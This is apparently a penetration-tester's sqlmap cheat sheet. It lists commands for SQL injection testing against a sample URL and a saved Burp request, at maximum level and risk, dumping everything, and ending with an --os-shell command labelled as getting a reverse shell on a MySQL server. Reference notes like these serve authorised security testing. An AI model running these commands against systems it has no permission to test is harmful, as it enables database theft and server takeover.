# sqlmap level and risk options
--level 5 --risk 3

# sqlmap search string response on site for successful injection
--string "successful injection text here"

# sqlmap Test All (Default Settings)
```bash
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch
```

# sqlmap Test All (Default Settings, High Stress)
```bash
sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
```

# sqlmap with burp request Test All (Default Settings)
```bash
sqlmap --all -r post_request.txt --batch 
```

# sqlmap with burp request Test All (Default Settings, High Stress)
```bash
sqlmap --all -r post_request.txt --batch --level=5 --risk=3
```

# sqlmap with burp request Get A Reverse Shell (MySQL)
```bash
sqlmap -r post_request.txt --dbms "mysql" --os-shell
```
